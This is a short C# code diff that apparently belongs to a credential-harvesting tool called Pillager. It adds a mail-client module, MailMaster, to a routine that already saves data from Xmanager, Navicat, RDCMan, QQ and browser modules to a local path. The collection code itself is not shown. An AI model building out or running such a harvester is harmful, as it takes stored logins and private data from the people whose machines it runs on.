@@ -1,6 +1,7 @@
 ﻿using System.IO;
 using Pillager.Browsers;
 using Pillager.Helper;
+using Pillager.Mails;
 using Pillager.Messengers;
 using Pillager.Others;
 using Pillager.Tools;
@@ -31,6 +32,9 @@ namespace Pillager
             Xmanager.Save(savepath);
             Navicat.Save(savepath);
             RDCMan.Save(savepath);
+
+            //Mail
+            MailMaster.Save(savepath);
 
             //Messengers
             QQ.Save(savepath);
